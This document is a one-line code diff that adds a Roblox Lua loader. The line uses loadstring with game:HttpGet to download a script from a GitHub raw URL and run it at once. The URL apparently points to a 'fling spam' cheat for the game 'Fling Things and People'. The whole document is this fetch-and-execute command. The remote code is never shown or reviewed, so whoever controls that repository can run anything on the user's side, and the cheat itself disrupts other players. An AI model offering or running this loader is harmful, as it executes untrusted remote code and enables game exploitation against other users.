@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/fling-things-and-people-spam6-2pa3gy3xivotih.lua"))()
